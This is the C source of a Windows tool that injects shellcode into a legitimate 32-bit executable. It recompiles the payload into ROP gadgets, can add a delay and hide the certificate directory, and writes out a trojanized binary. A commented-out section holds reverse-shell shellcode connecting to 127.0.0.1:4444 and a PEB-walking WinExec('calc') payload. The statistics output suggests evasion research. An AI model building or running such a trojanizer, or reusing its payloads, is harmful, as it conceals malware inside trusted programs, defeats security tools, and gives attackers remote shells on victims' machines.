

#define STRICT
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>

#include "Patcher.h"
#include "Disasm.h"
#include "Asm.h"
#include "ROP.h"


double currentTimeSecs()
{
	FILETIME tm;
	ULONGLONG t;
#if defined(NTDDI_WIN8) && NTDDI_VERSION >= NTDDI_WIN8
	GetSystemTimePreciseAsFileTime(&tm);
#else
	GetSystemTimeAsFileTime(&tm);
#endif
	t = ((ULONGLONG)tm.dwHighDateTime << 32) | (ULONGLONG)tm.dwLowDateTime;
	return (double)t / 10000000.0;
}

/*
BYTE *getPatchCode(DWORD *length)
{
	static char *buf =
			"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
			"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
			"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
			"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0"
			"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b"
			"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff"
			"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d"
			"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b"
			"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44"
			"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
			"\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f"
			"\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29"
			"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50"
			"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x68"
			"\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"
			"\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"
			"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"
			"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"
			"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
			"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"
			"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"
			"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
			"\x6f\x6a\x00\x53\xff\xd5";
	*length = 314;
	return (BYTE *)buf;
}

BYTE *getPatchCode(DWORD *length)
{
	BYTE *ptr_start;
	DWORD len;

	__asm{
		mov [ptr_start], offset asm_start ; setup the return values
		mov eax, offset asm_end;
		sub eax, offset asm_start;
		mov len, eax;

		jmp return_						; comment this to test the function


asm_start:
		push ebp						; setup a stack frame
		mov ebp, esp					;


		xor edx, edx					; EDX = 0
		push edx						; Stack = 0
		push 0x636c6163					; Stack = "calc", 0
		mov esi, esp                    ; ESI = &("calc")
		push edx                        ; Stack = 0, "calc", 0
		push esi                        ; Stack = &("calc"), 0, "calc", 0
; Stack contains arguments for WinExec
		mov esi, fs:[edx + 0x30]        ; ESI = [TEB + 0x30] = PEB
		mov esi, [esi + 0x0C]           ; ESI = [PEB + 0x0C] = PEB_LDR_DATA
		mov esi, [esi + 0x0C]           ; ESI = [PEB_LDR_DATA + 0x0C] = LDR_MODULE InLoadOrder[0] (process)
		lodsd                           ; EAX = InLoadOrder[1] (ntdll)
		mov esi, [eax]                  ; ESI = InLoadOrder[2] (kernel32)
		mov edi, [esi + 0x18]           ; EDI = [InLoadOrder[2] + 0x18] = kernel32 DllBase
; Found kernel32 base address (EDI)
		mov ebx, [edi + 0x3C]           ; EBX = [kernel32 + 0x3C] = offset(PE header)
		mov ebx, [edi + ebx + 0x78]     ; EBX = [kernel32 + offset(PE header) + 0x78] = offset(export table)
; Found export table offset (EBX)
		mov esi, [edi + ebx + 0x20]     ; ESI = [kernel32 + offset(export table) + 0x20] = offset(names table)
		add esi, edi                    ; ESI = kernel32 + offset(names table) = &(names table)
; Found export names table (ESI)
		mov ecx, [edi + ebx + 0x24]     ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
		add ecx, edi                    ; ECX = kernel32 + offset(ordinals table) = ordinals table
; Found export ordinals table (ECX)
find_winexec_x86:
		inc edx                         ; EDX = function number + 1
		lodsd                           ; EAX = &(names table[function number]) = offset(function name)
		cmp dword ptr [edi + eax], 0x456E6957; *(DWORD*)(function name) == "WinE" ?
		jne find_winexec_x86            ;
; Found WinExec ordinal (EDX)
		movzx dx, word ptr [ecx + edx * 2 - 2]
                                        ; EDX = [ordinals table + (WinExec function number + 1) * 2 - 2] = WinExec function ordinal
		mov esi, dword ptr [edi + ebx + 0x1C]; ESI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
		add esi, edi                    ; ESI = kernel32 + offset(address table) = &(address table)
		add edi, dword ptr [esi + edx * 4]; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)

		call edi						; WinExec(&("calc"), 0);


		mov esp, ebp;					; clear the stack frame
		pop ebp;
asm_end:

	};

return_:
	*length = len;
	return ptr_start;
}
*/

const char *getFilename(const char* path)
{
	const char *filename;
	filename = strrchr(path, '/');
	if (!filename)
		filename = path;
	else
		filename += 1;

	const char *tmp = filename;
	filename = strrchr(tmp, '\\');
	if (!filename)
		filename = tmp;
	else
		filename += 1;

	return filename;
}

int main(int argc, char **argv)
{
	__asm {

	}

	char str[512] = { 0 };
	DWORD strLen;
	if (argc < 3)
	{
		puts("Usage:");
		strcat(str, "  ");
		strncat(str, getFilename(argv[0]), 20);
		strcat(str, " <benign file> <shellcode file> <output file>* <text/norop/nounroll/noinj/getpc/entry/-d<delay>>*");
		puts(str);
		return -1;
	}
	
	const char *filename = argv[1];
	const char *shFilename = argv[2];
	char *outFilename = NULL;

	BOOL shText = FALSE;
	BOOL ROP = TRUE;
	BOOL doUnroll = TRUE;
	BOOL doInject = TRUE;
	BOOL doReplGetPC = TRUE;
	EXEC_POINT execPt = EXIT;
	DWORD delay = 0;
	if (argc > 3)
	{
		for (int i = 3; i < argc; i++)
		{
			if (strncmp(argv[i], "text", 4) == 0)
				shText = TRUE;
			else if (strncmp(argv[i], "norop", 5) == 0)
				ROP = FALSE;
			else if (strncmp(argv[i], "nounroll", 8) == 0)
				doUnroll = FALSE;
			else if (strncmp(argv[i], "noinj", 5) == 0)
				doInject = FALSE;
			else if (strncmp(argv[i], "getpc", 5) == 0)
				doReplGetPC = FALSE;
			else if (strncmp(argv[i], "entry", 5) == 0)
				execPt = ENTRY;
			else if (strncmp(argv[i], "--delay=", strlen("--delay=")) == 0)
				delay = 1000*atoi(argv[i] + strlen("--delay="));
			else if (strncmp(argv[i], "-d", strlen("-d")) == 0 && (strlen(argv[i]) > 2 || i+1 < argc))
				delay = 1000 * atoi(strlen(argv[i]) > 2 ? (argv[i] + strlen("-d")) : argv[++i]);
			else
				outFilename = argv[i];
		}
	}


	int exitCode = EXIT_SUCCESS;
	DWORD size, initialSize;// the original PE file size
	LPVOID base = NULL;		// ptr to the PE file when loaded in memory
	DWORD numInstr;
	INSTRUCTION *iHead = NULL;
	PATCH patch;			// PATCH struct to be patched in the PE file
	INIT_PATCH(&patch);
	BYTE *shCode = NULL;	// the input code to be patched in the PE file
	DWORD shCodeSize;
	GADGET_END *endings = NULL;
	GADGET *gadgets = NULL;


	// load the original PE
	if (!(base = loadFile(filename, &size)))
	{
		printf("[-] Error loading \"%s\"\n", filename);
		goto exit_failure;
	}
	initialSize = size;

	PIMAGE_NT_HEADERS nt_header;
	if (init(base, 0, 0, &nt_header, 0, 0) != 0)
	{
		printf("[-] Error reading PE headers \"%s\"\n", filename);
		goto exit_failure;
	}

	if (!nt_header->FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE)
	{
		puts("[-] This tool supports only 32bit executables");
		goto exit_failure;
	}

	if (!(nt_header->FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) ||
		!(nt_header->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) ||
		(nt_header->FileHeader.Characteristics & IMAGE_FILE_DLL))
	{
		puts("[-] Only 32bit executables are currently supported");
		goto exit_failure;
	}


	// load the shellcode and initialize the patch structure
	patch.execPt = execPt;
	printf("[.] Input file is %s\n", filename);

	shCode = (BYTE *)loadFile(shFilename, &shCodeSize);
	if (shCode && shCodeSize && !shText)
	{
		long i = -4, dummy; // in case the user ommits "text"
		while (((i = i + 4) < shCodeSize) && sscanf((char *)(shCode + i), "\\x%02x", &dummy) == 1);
		shText = i == shCodeSize;
	}
	if (!shCode || !shCodeSize || (shText && shCodeSize / 4 < 1))
	{
		printf("[-] Error loading \"%s\"\n", shFilename);
		goto exit_failure;
	}
	if (shText)
	{
		char *pos = (char *)shCode;
		shCodeSize = shCodeSize / 4;
		BYTE *tmp = (BYTE *)calloc(shCodeSize+500, sizeof(BYTE));
		long cnt = -1;
		int res = 1;
		while (res == 1 && ++cnt < shCodeSize)
		{
			res = sscanf(pos, "\\x%02x", tmp + cnt);
			pos += 4;
		}
		if (res != 1)
			printf("[-] Error reading shellcode at location: \"...%s\"", pos);
		else
			printf("[%s] Read %d bytes from %s\n", cnt ? "+" : "-", cnt, shFilename);

		free(shCode);
		shCode = tmp;
		if (!cnt)
			goto exit_failure;
	}


	iHead = analyze(shCode, shCodeSize, &numInstr, 0);

	printf("[.] Disassembly of %s\n", shFilename);
	printIDisassembly(iHead);

	const DWORD initNumInstr = numInstr;

	// invoke sleep() if requested
	if (delay)
	{
		DWORD sleepVA = addImport(&base, &size, "kernel32.dll", "Sleep", 0x0550);
		if (sleepVA)
		{
			INSTRUCTION newI[2];
			INSTRUCTION *push = newI, *call = newI + 1;
			INIT_INSTR(push);
			INIT_INSTR(call);
			push->next = call;
			push->index = 0;
			call->next = NULL;
			call->index = 1;
			setPUSH_IMM32(push, delay);
			setCALL_IND(call, sleepVA);
			SET_INVALID_VA(call);
			insertAllInstr(&iHead, &numInstr, newI, 0);
		}
		else
		{
			delay = 0;
			puts("[!] Failed to inject import Sleep() from kernel32.dll");
		}
	}

	// replace with 32bit rel. jmps to avoid overflows when unrolling or ROPing later
	if (doUnroll || ROP)
	{
		if (!makeAllRel32Braches(&iHead, &numInstr))
		{
			printf("[-] Error converting to rel32 jumps\n");
			goto exit_failure;
		}
	}

	if (doUnroll)
	{
		// unroll SIBs to enhance gadget matching
		unrollAllSIBDisp(&iHead, &numInstr);

		puts("[.] Disassembly after makeRel32Branches + unrollAllSIBDisp:");
		printIDisassembly(iHead);
	}

#ifdef DEBUG_MODE
	printf("[+] Shellcode consists of %d instructions\n", numInstr);
	puts("[+] Analyzing register usage... free register ranges:");
	INST_RANGE_LIST **freeRegRanges = getFreeRegRanges(iHead);
	printFreeRanges((const INST_RANGE_LIST **)freeRegRanges);
	freeRegFreeRanges(freeRegRanges);

	
	INSTRUCTION *i = iHead;
	BYTE freeRegCount;
	do {
		freeRegCount = COUNT_REGS(i->freeRegs);
		if (freeRegCount < 1)
		{
			printInstruction(i);
			printf("[!] Instruction has %d free registers\n", freeRegCount);
		}
	} while((i = i->next) != NULL);
#endif

	DWORD numInstrBefROP = numInstr;
	DWORD numGdgsInjected = 0, numGdgSegments = 0, numReplByInj = 0, numInsReplaced = 0;

	// will keep track of code section extensions, so as to correct RVAs in patch code (e.g. see call to Sleep())
	PIMAGE_SECTION_HEADER hdrFollowingCode = getCodeSectionHeader(base) + 1;
	const DWORD sectRVAAfterCode = hdrFollowingCode->VirtualAddress;

	if (ROP)
	{
		// look for valid gadget endings first
		puts("[.] Searching for gadget endings in code segment...");
		endings = getCandGadgets(base);

#ifdef DEBUG_MODE
		DWORD rets = 0, retns = 0, jmps = 0, noload = 0;
		for (GADGET_END *e = endings; e->va; e++)
		{
			switch (e->type)
			{
			case RET: rets++; break;
			case RETN: retns++; break;
			case JMP: jmps++; break;
			}

			if (GEND_NO_LOAD(e))
				noload++;
		}
		if (rets + retns + jmps > 0)
		{
			printf("[+] Found %d gadget endings\n", rets + retns + jmps);
			printf("\tout of which: %d RETs, %d RETNs, %d JMP reg\n", rets, retns, jmps);
			printf("\tout of which: %d are JMPs without loader\n", noload);
		}
		else
			puts("[!] No gadget endings found.");
#endif

		// search for useful gadgets within the set of endings
		puts("[.] Searching for gadgets in endings...");
		double t0 = currentTimeSecs();
		gadgets = parseGadgets(base, endings);

		DWORD numGdgs = 0, cntComposite = 0, cntLoaders = 0;;
		DWORD gdgCounts[NUM_INSTR_TYPES] = { 0 };
		for (GADGET *gdg = gadgets; gdg->va; gdg++, numGdgs++)
		{
			if (GEND_NO_LOAD(gdg->ending) || G_HAS_FLAG(gdg, STD_EPILOGUE))
			{
				cntComposite++;
				if (gdg->loader)
					cntLoaders++;
			}
			gdgCounts[gdg->gi.type]++;
		}
		printf("[%s] Found %d distinct gadgets in %f seconds\n", numGdgs ? "+" : "!", numGdgs, (currentTimeSecs() - t0));
		if (numGdgs)
		{
			printf("\tout of which: %d need a special loader (%d found)\n", cntComposite, cntLoaders);
			printf("\tout of which: %d %s", gdgCounts[0], INSTR_TYPES[0]);
			for (DWORD i = 1; i < NUM_INSTR_TYPES; i++)
			{
				if (gdgCounts[i])
					printf(", %d %s", gdgCounts[i], INSTR_TYPES[i]);
			}
			printf("\n");
		}

		long res = ropCompile(&iHead, &numInstr, &endings, &gadgets, (doInject ? &base : NULL), &size,
			&numGdgsInjected, &numGdgSegments, &numReplByInj);
		if (res < 0)
		{
			if (res == -2)
				puts("[-] Error replacing instruction range in ROP compilation");
			else
				printf("[-] Error %d when compiling to ROP", numInsReplaced);
			goto exit_failure;
		}
		else
			numInsReplaced = res;

		printf("[%s] Replaced %d/%d instructions with gadgets in %d segments\n",
			numInsReplaced ? "+" : "!", numInsReplaced, numInstrBefROP, numGdgSegments);
		printf("[+] %d/%d replacements achieved by %d injected gadgets\n",
			numReplByInj, numInsReplaced, numGdgsInjected);

#ifdef DEBUG_MODE
		puts("[.] Disassembly after ROP compilation");
		printIDisassembly(iHead);
#endif
	}

	// replace getPC with VAs (we know image base and we can patch in relocs too)
	if (doReplGetPC) // can't do this before ROP because we won't know the right RVA
		replaceAllGetPC(&iHead, &numInstr, base);


	// special treatment
	// Needed for RVAs in patch code referring to sections after .text (e.g. call Sleep()).
	// They must be corrected accordingly, since .text may have been extended (the case in injected gadgets)
	hdrFollowingCode = getCodeSectionHeader(base) + 1;
	int codeSectionVDelta = hdrFollowingCode->VirtualAddress - sectRVAAfterCode;
	init(base, 0, 0, &nt_header, 0, 0);
	i = iHead;
	while (i)
	{
		if (HAS_INVALID_VA(i) && i->directVA)
		{
			DWORD rva = *((DWORD *)(i->data + i->directVA)) - nt_header->OptionalHeader.ImageBase;
			if (rva >= sectRVAAfterCode)
				*((DWORD *)(i->data + i->directVA)) += codeSectionVDelta;
		}
		i = i->next;
	}



	// build the patch, and track relocations in it
	puts("[+] Patching PE file...");
	patch.code = getCode(iHead, &(patch.codeSize));
	setRelocs(iHead, &(patch.relocs));
	printf("[+] Final patch is %d bytes long\n", patch.codeSize);


	// patch the PE file
	int retval = 0;
	if ((retval = patchPEInMemory(&base, &size, &patch)) != 0)
    {
        printf("[-] Error %d while patching in memory\n", retval);
		goto exit_failure;
    }

	// hide the certificate directory
	hideCertificate(base);


	if (outFilename == NULL)
	{
		const char *shellcodeName = getFilename(shFilename); 
		const char *carrierName = getFilename(filename);
		strLen = strnlen(shellcodeName, 20);
		strLen = strLen == 20 ? strLen : (strrchr(shellcodeName, '.') - shellcodeName);
		outFilename = (char *)calloc(strnlen(carrierName, 20) + strLen + 100, sizeof(char));
		strncpy(outFilename, carrierName, strnlen(carrierName, 20) - 4);
		strncpy(str, shellcodeName, strLen);
		strcat(outFilename, "-");
		strcat(outFilename, str);
		if (!doUnroll)
			strcat(outFilename, "-nounroll");
		if (!ROP)
			strcat(outFilename, "-norop");
		if (!doInject)
			strcat(outFilename, "-noinj");
		if (!doReplGetPC)
			strcat(outFilename, "-getpc");
		if (patch.execPt == ENTRY)
			strcat(outFilename, "-entry");
		if (delay)
		{
			sprintf(str, "-d%d", delay / 1000);
			strcat(outFilename, str);
		}
		strcat(outFilename, ".exe");
	}

	// write back to disk the pathced file
	DWORD writtenBytes = writeDataToFile(outFilename, base, size);
	if (writtenBytes < 1 || writtenBytes != size)
	{
		printf("[-] Error writing %d bytes to \"%s\"\n", size, outFilename);
		goto exit_failure;
	}


	printf("[+] \"%s\"  patched successfully to:  \"%s\"\n", filename, outFilename);
	printf("[+] Stats: %s, %s, %s, "
					"%d, %d, %d, "
					"%d, %d, %d, %d, %d, "
					"%d, %d, %d, %d, %d, %d\n", 
					filename, outFilename, shFilename,
					initialSize, shCodeSize, patch.codeSize,
					doUnroll, ROP, doReplGetPC, patch.execPt == ENTRY ? 0 : 1, delay/1000,
					initNumInstr, numInstrBefROP, numInsReplaced, numGdgsInjected, numGdgSegments, numReplByInj);
	goto exit;

exit_failure:
	exitCode = EXIT_FAILURE;
	getch();

exit:
	if (argc <= 3)
		free(outFilename);
	if (shCode)
		free(shCode);
	if (iHead)
		free(iHead);
	freePatch(&patch);
	if (base)
		free(base);
	if (endings)
		free(endings);
	if (gadgets)
		freeGadgets(gadgets);
    return exitCode;
}